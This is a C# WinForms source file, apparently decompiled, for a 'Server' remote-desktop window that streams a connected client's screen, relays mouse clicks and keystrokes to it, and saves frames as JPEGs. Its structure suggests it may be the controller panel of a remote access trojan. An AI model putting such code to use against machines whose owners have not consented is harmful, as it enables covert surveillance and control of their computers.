using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Threading;
using System.Windows.Forms;
using Server.Connection;
using Server.MessagePack;
using Server.Properties;
using StreamLibrary;
using StreamLibrary.UnsafeCodecs;

namespace Server.Forms;

public class FormRemoteDesktop : Form
{
	public int FPS;

	public Stopwatch sw = Stopwatch.StartNew();

	public IUnsafeCodec decoder = new UnsafeStreamCodec(60);

	public Size rdSize;

	private bool isMouse;

	private bool isKeyboard;

	public object syncPicbox = new object();

	private readonly List<Keys> _keysPressed;

	private IContainer components;

	public PictureBox pictureBox1;

	public System.Windows.Forms.Timer timer1;

	private Panel panel1;

	private Label label1;

	private Button button1;

	private Button button2;

	public NumericUpDown numericUpDown1;

	private Label label2;

	public NumericUpDown numericUpDown2;

	private Button btnSave;

	private System.Windows.Forms.Timer timerSave;

	private Button btnMouse;

	public Label labelWait;

	private Button btnKeyboard;

	public Form1 F { get; set; }

	internal Clients ParentClient { get; set; }

	internal Clients Client { get; set; }

	public string FullPath { get; set; }

	public Image GetImage { get; set; }

	public FormRemoteDesktop()
	{
		_keysPressed = new List<Keys>();
		InitializeComponent();
	}

	private void timer1_Tick(object sender, EventArgs e)
	{
		try
		{
			if (!ParentClient.TcpClient.Connected || !Client.TcpClient.Connected)
			{
				Close();
			}
		}
		catch
		{
			Close();
		}
	}

	private void Button2_Click(object sender, EventArgs e)
	{
		if (!panel1.Visible)
		{
			panel1.Visible = true;
			button2.Top = panel1.Bottom + 5;
			button2.BackgroundImage = Resources.arrow_up;
		}
		else
		{
			panel1.Visible = false;
			button2.Top = pictureBox1.Top + 5;
			button2.BackgroundImage = Resources.arrow_down;
		}
	}

	private void FormRemoteDesktop_Load(object sender, EventArgs e)
	{
		try
		{
			button2.Top = panel1.Bottom + 5;
			button2.Left = pictureBox1.Width / 2;
			button1.Tag = "stop";
			button2.PerformClick();
		}
		catch
		{
		}
	}

	private void Button1_Click(object sender, EventArgs e)
	{
		if (button1.Tag == "play")
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Packet").AsString = "remoteDesktop";
			msgPack.ForcePathObject("Option").AsString = "capture";
			msgPack.ForcePathObject("Quality").AsInteger = Convert.ToInt32(numericUpDown1.Value.ToString());
			msgPack.ForcePathObject("Screen").AsInteger = Convert.ToInt32(numericUpDown2.Value.ToString());
			decoder = new UnsafeStreamCodec(Convert.ToInt32(numericUpDown1.Value));
			ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
			numericUpDown1.Enabled = false;
			numericUpDown2.Enabled = false;
			btnSave.Enabled = true;
			btnMouse.Enabled = true;
			button1.Tag = "stop";
			button1.BackgroundImage = Resources.stop__1_;
		}
		else
		{
			button1.Tag = "play";
			try
			{
				MsgPack msgPack2 = new MsgPack();
				msgPack2.ForcePathObject("Packet").AsString = "remoteDesktop";
				msgPack2.ForcePathObject("Option").AsString = "stop";
				ThreadPool.QueueUserWorkItem(Client.Send, msgPack2.Encode2Bytes());
			}
			catch
			{
			}
			numericUpDown1.Enabled = true;
			numericUpDown2.Enabled = true;
			btnSave.Enabled = false;
			btnMouse.Enabled = false;
			button1.BackgroundImage = Resources.play_button;
		}
	}

	private void FormRemoteDesktop_ResizeEnd(object sender, EventArgs e)
	{
		button2.Left = pictureBox1.Width / 2;
	}

	private void BtnSave_Click(object sender, EventArgs e)
	{
		if (button1.Tag != "stop")
		{
			return;
		}
		if (timerSave.Enabled)
		{
			timerSave.Stop();
			btnSave.BackgroundImage = Resources.save_image;
			return;
		}
		timerSave.Start();
		btnSave.BackgroundImage = Resources.save_image2;
		try
		{
			if (!Directory.Exists(FullPath))
			{
				Directory.CreateDirectory(FullPath);
			}
			Process.Start(FullPath);
		}
		catch
		{
		}
	}

	private void TimerSave_Tick(object sender, EventArgs e)
	{
		try
		{
			if (!Directory.Exists(FullPath))
			{
				Directory.CreateDirectory(FullPath);
			}
			Encoder quality = Encoder.Quality;
			EncoderParameters encoderParameters = new EncoderParameters(1);
			EncoderParameter encoderParameter = new EncoderParameter(quality, 50L);
			encoderParameters.Param[0] = encoderParameter;
			ImageCodecInfo encoder = GetEncoder(ImageFormat.Jpeg);
			pictureBox1.Image.Save(FullPath + "\\IMG_" + DateTime.Now.ToString("MM-dd-yyyy HH;mm;ss") + ".jpeg", encoder, encoderParameters);
			encoderParameters?.Dispose();
			encoderParameter?.Dispose();
		}
		catch
		{
		}
	}

	private ImageCodecInfo GetEncoder(ImageFormat format)
	{
		ImageCodecInfo[] imageDecoders = ImageCodecInfo.GetImageDecoders();
		foreach (ImageCodecInfo imageCodecInfo in imageDecoders)
		{
			if (imageCodecInfo.FormatID == format.Guid)
			{
				return imageCodecInfo;
			}
		}
		return null;
	}

	private void PictureBox1_MouseDown(object sender, MouseEventArgs e)
	{
		try
		{
			if (button1.Tag == "stop" && pictureBox1.Image != null && pictureBox1.ContainsFocus && isMouse)
			{
				Point point = new Point(e.X * rdSize.Width / pictureBox1.Width, e.Y * rdSize.Height / pictureBox1.Height);
				int num = 0;
				if (e.Button == MouseButtons.Left)
				{
					num = 2;
				}
				if (e.Button == MouseButtons.Right)
				{
					num = 8;
				}
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Packet").AsString = "remoteDesktop";
				msgPack.ForcePathObject("Option").AsString = "mouseClick";
				msgPack.ForcePathObject("X").AsInteger = point.X;
				msgPack.ForcePathObject("Y").AsInteger = point.Y;
				msgPack.ForcePathObject("Button").AsInteger = num;
				ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
			}
		}
		catch
		{
		}
	}

	private void PictureBox1_MouseUp(object sender, MouseEventArgs e)
	{
		try
		{
			if (button1.Tag == "stop" && pictureBox1.Image != null && pictureBox1.ContainsFocus && isMouse)
			{
				Point point = new Point(e.X * rdSize.Width / pictureBox1.Width, e.Y * rdSize.Height / pictureBox1.Height);
				int num = 0;
				if (e.Button == MouseButtons.Left)
				{
					num = 4;
				}
				if (e.Button == MouseButtons.Right)
				{
					num = 16;
				}
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Packet").AsString = "remoteDesktop";
				msgPack.ForcePathObject("Option").AsString = "mouseClick";
				msgPack.ForcePathObject("X").AsInteger = point.X;
				msgPack.ForcePathObject("Y").AsInteger = point.Y;
				msgPack.ForcePathObject("Button").AsInteger = num;
				ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
			}
		}
		catch
		{
		}
	}

	private void Button3_Click(object sender, EventArgs e)
	{
		if (isMouse)
		{
			isMouse = false;
			btnMouse.BackgroundImage = Resources.mouse;
		}
		else
		{
			isMouse = true;
			btnMouse.BackgroundImage = Resources.mouse_enable;
		}
		pictureBox1.Focus();
	}

	private void FormRemoteDesktop_FormClosed(object sender, FormClosedEventArgs e)
	{
		try
		{
			GetImage?.Dispose();
			ThreadPool.QueueUserWorkItem(delegate
			{
				Client?.Disconnected();
			});
		}
		catch
		{
		}
	}

	private void btnKeyboard_Click(object sender, EventArgs e)
	{
		if (isKeyboard)
		{
			isKeyboard = false;
			btnKeyboard.BackgroundImage = Resources.keyboard;
		}
		else
		{
			isKeyboard = true;
			btnKeyboard.BackgroundImage = Resources.keyboard_on;
		}
		pictureBox1.Focus();
	}

	private void FormRemoteDesktop_KeyDown(object sender, KeyEventArgs e)
	{
		if (button1.Tag == "stop" && pictureBox1.Image != null && pictureBox1.ContainsFocus && isKeyboard)
		{
			if (!IsLockKey(e.KeyCode))
			{
				e.Handled = true;
			}
			if (!_keysPressed.Contains(e.KeyCode))
			{
				_keysPressed.Add(e.KeyCode);
				MsgPack msgPack = new MsgPack();
				msgPack.ForcePathObject("Packet").AsString = "remoteDesktop";
				msgPack.ForcePathObject("Option").AsString = "keyboardClick";
				msgPack.ForcePathObject("key").AsInteger = Convert.ToInt32(e.KeyCode);
				msgPack.ForcePathObject("keyIsDown").SetAsBoolean(bVal: true);
				ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
			}
		}
	}

	private void FormRemoteDesktop_KeyUp(object sender, KeyEventArgs e)
	{
		if (button1.Tag == "stop" && pictureBox1.Image != null && base.ContainsFocus && isKeyboard)
		{
			if (!IsLockKey(e.KeyCode))
			{
				e.Handled = true;
			}
			_keysPressed.Remove(e.KeyCode);
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Packet").AsString = "remoteDesktop";
			msgPack.ForcePathObject("Option").AsString = "keyboardClick";
			msgPack.ForcePathObject("key").AsInteger = Convert.ToInt32(e.KeyCode);
			msgPack.ForcePathObject("keyIsDown").SetAsBoolean(bVal: false);
			ThreadPool.QueueUserWorkItem(Client.Send, msgPack.Encode2Bytes());
		}
	}

	private bool IsLockKey(Keys key)
	{
		if ((key & Keys.Capital) != Keys.Capital && (key & Keys.NumLock) != Keys.NumLock)
		{
			return (key & Keys.Scroll) == Keys.Scroll;
		}
		return true;
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		base.Dispose(disposing);
	}

	private void InitializeComponent()
	{
		this.components = new System.ComponentModel.Container();
		System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Server.Forms.FormRemoteDesktop));
		this.pictureBox1 = new System.Windows.Forms.PictureBox();
		this.timer1 = new System.Windows.Forms.Timer(this.components);
		this.panel1 = new System.Windows.Forms.Panel();
		this.btnKeyboard = new System.Windows.Forms.Button();
		this.btnMouse = new System.Windows.Forms.Button();
		this.btnSave = new System.Windows.Forms.Button();
		this.label2 = new System.Windows.Forms.Label();
		this.numericUpDown2 = new System.Windows.Forms.NumericUpDown();
		this.label1 = new System.Windows.Forms.Label();
		this.numericUpDown1 = new System.Windows.Forms.NumericUpDown();
		this.button1 = new System.Windows.Forms.Button();
		this.button2 = new System.Windows.Forms.Button();
		this.timerSave = new System.Windows.Forms.Timer(this.components);
		this.labelWait = new System.Windows.Forms.Label();
		((System.ComponentModel.ISupportInitialize)this.pictureBox1).BeginInit();
		this.panel1.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.numericUpDown2).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.numericUpDown1).BeginInit();
		base.SuspendLayout();
		this.pictureBox1.Dock = System.Windows.Forms.DockStyle.Fill;
		this.pictureBox1.Location = new System.Drawing.Point(0, 0);
		this.pictureBox1.Name = "pictureBox1";
		this.pictureBox1.Size = new System.Drawing.Size(938, 485);
		this.pictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
		this.pictureBox1.TabIndex = 0;
		this.pictureBox1.TabStop = false;
		this.pictureBox1.MouseDown += new System.Windows.Forms.MouseEventHandler(PictureBox1_MouseDown);
		this.pictureBox1.MouseUp += new System.Windows.Forms.MouseEventHandler(PictureBox1_MouseUp);
		this.timer1.Interval = 2000;
		this.timer1.Tick += new System.EventHandler(timer1_Tick);
		this.panel1.BackColor = System.Drawing.Color.Transparent;
		this.panel1.Controls.Add(this.btnKeyboard);
		this.panel1.Controls.Add(this.btnMouse);
		this.panel1.Controls.Add(this.btnSave);
		this.panel1.Controls.Add(this.label2);
		this.panel1.Controls.Add(this.numericUpDown2);
		this.panel1.Controls.Add(this.label1);
		this.panel1.Controls.Add(this.numericUpDown1);
		this.panel1.Controls.Add(this.button1);
		this.panel1.Dock = System.Windows.Forms.DockStyle.Top;
		this.panel1.Location = new System.Drawing.Point(0, 0);
		this.panel1.Name = "panel1";
		this.panel1.Size = new System.Drawing.Size(938, 38);
		this.panel1.TabIndex = 1;
		this.btnKeyboard.BackgroundImage = Server.Properties.Resources.keyboard;
		this.btnKeyboard.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
		this.btnKeyboard.Location = new System.Drawing.Point(622, 3);
		this.btnKeyboard.Name = "btnKeyboard";
		this.btnKeyboard.Size = new System.Drawing.Size(32, 32);
		this.btnKeyboard.TabIndex = 6;
		this.btnKeyboard.UseVisualStyleBackColor = true;
		this.btnKeyboard.Click += new System.EventHandler(btnKeyboard_Click);
		this.btnMouse.BackgroundImage = Server.Properties.Resources.mouse;
		this.btnMouse.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
		this.btnMouse.Location = new System.Drawing.Point(550, 3);
		this.btnMouse.Name = "btnMouse";
		this.btnMouse.Size = new System.Drawing.Size(32, 32);
		this.btnMouse.TabIndex = 3;
		this.btnMouse.UseVisualStyleBackColor = true;
		this.btnMouse.Click += new System.EventHandler(Button3_Click);
		this.btnSave.BackgroundImage = Server.Properties.Resources.save_image;
		this.btnSave.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
		this.btnSave.Location = new System.Drawing.Point(455, 3);
		this.btnSave.Name = "btnSave";
		this.btnSave.Size = new System.Drawing.Size(32, 32);
		this.btnSave.TabIndex = 5;
		this.btnSave.UseVisualStyleBackColor = true;
		this.btnSave.Click += new System.EventHandler(BtnSave_Click);
		this.label2.AutoSize = true;
		this.label2.Location = new System.Drawing.Point(268, 9);
		this.label2.Name = "label2";
		this.label2.Size = new System.Drawing.Size(76, 20);
		this.label2.TabIndex = 4;
		this.label2.Text = "SCREEN";
		this.numericUpDown2.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
		this.numericUpDown2.Enabled = false;
		this.numericUpDown2.Increment = new decimal(new int[4] { 10, 0, 0, 0 });
		this.numericUpDown2.Location = new System.Drawing.Point(352, 5);
		this.numericUpDown2.Maximum = new decimal(new int[4]);
		this.numericUpDown2.Name = "numericUpDown2";
		this.numericUpDown2.Size = new System.Drawing.Size(63, 26);
		this.numericUpDown2.TabIndex = 3;
		this.numericUpDown2.TextAlign = System.Windows.Forms.HorizontalAlignment.Center;
		this.numericUpDown2.UpDownAlign = System.Windows.Forms.LeftRightAlignment.Left;
		this.label1.AutoSize = true;
		this.label1.Location = new System.Drawing.Point(82, 9);
		this.label1.Name = "label1";
		this.label1.Size = new System.Drawing.Size(78, 20);
		this.label1.TabIndex = 2;
		this.label1.Text = "QUALITY";
		this.numericUpDown1.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
		this.numericUpDown1.Enabled = false;
		this.numericUpDown1.Increment = new decimal(new int[4] { 10, 0, 0, 0 });
		this.numericUpDown1.Location = new System.Drawing.Point(166, 5);
		this.numericUpDown1.Minimum = new decimal(new int[4] { 20, 0, 0, 0 });
		this.numericUpDown1.Name = "numericUpDown1";
		this.numericUpDown1.Size = new System.Drawing.Size(82, 26);
		this.numericUpDown1.TabIndex = 1;
		this.numericUpDown1.TextAlign = System.Windows.Forms.HorizontalAlignment.Center;
		this.numericUpDown1.UpDownAlign = System.Windows.Forms.LeftRightAlignment.Left;
		this.numericUpDown1.Value = new decimal(new int[4] { 30, 0, 0, 0 });
		this.button1.BackgroundImage = Server.Properties.Resources.stop__1_;
		this.button1.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
		this.button1.Location = new System.Drawing.Point(12, 3);
		this.button1.Name = "button1";
		this.button1.Size = new System.Drawing.Size(32, 32);
		this.button1.TabIndex = 0;
		this.button1.UseVisualStyleBackColor = true;
		this.button1.Click += new System.EventHandler(Button1_Click);
		this.button2.BackgroundImage = Server.Properties.Resources.arrow_up;
		this.button2.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
		this.button2.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
		this.button2.Location = new System.Drawing.Point(428, 44);
		this.button2.Name = "button2";
		this.button2.Size = new System.Drawing.Size(18, 18);
		this.button2.TabIndex = 2;
		this.button2.Text = " ";
		this.button2.UseVisualStyleBackColor = true;
		this.button2.Click += new System.EventHandler(Button2_Click);
		this.timerSave.Interval = 1500;
		this.timerSave.Tick += new System.EventHandler(TimerSave_Tick);
		this.labelWait.AutoSize = true;
		this.labelWait.Font = new System.Drawing.Font("Microsoft Sans Serif", 12f);
		this.labelWait.Location = new System.Drawing.Point(376, 222);
		this.labelWait.Name = "labelWait";
		this.labelWait.Size = new System.Drawing.Size(78, 29);
		this.labelWait.TabIndex = 3;
		this.labelWait.Text = "Wait...";
		base.AutoScaleDimensions = new System.Drawing.SizeF(9f, 20f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		base.ClientSize = new System.Drawing.Size(938, 485);
		base.Controls.Add(this.labelWait);
		base.Controls.Add(this.button2);
		base.Controls.Add(this.panel1);
		base.Controls.Add(this.pictureBox1);
		base.Icon = (System.Drawing.Icon)resources.GetObject("$this.Icon");
		base.KeyPreview = true;
		this.MinimumSize = new System.Drawing.Size(655, 440);
		base.Name = "FormRemoteDesktop";
		this.Text = "RemoteDesktop";
		base.FormClosed += new System.Windows.Forms.FormClosedEventHandler(FormRemoteDesktop_FormClosed);
		base.Load += new System.EventHandler(FormRemoteDesktop_Load);
		base.ResizeEnd += new System.EventHandler(FormRemoteDesktop_ResizeEnd);
		base.KeyDown += new System.Windows.Forms.KeyEventHandler(FormRemoteDesktop_KeyDown);
		base.KeyUp += new System.Windows.Forms.KeyEventHandler(FormRemoteDesktop_KeyUp);
		((System.ComponentModel.ISupportInitialize)this.pictureBox1).EndInit();
		this.panel1.ResumeLayout(false);
		this.panel1.PerformLayout();
		((System.ComponentModel.ISupportInitialize)this.numericUpDown2).EndInit();
		((System.ComponentModel.ISupportInitialize)this.numericUpDown1).EndInit();
		base.ResumeLayout(false);
		base.PerformLayout();
	}
}
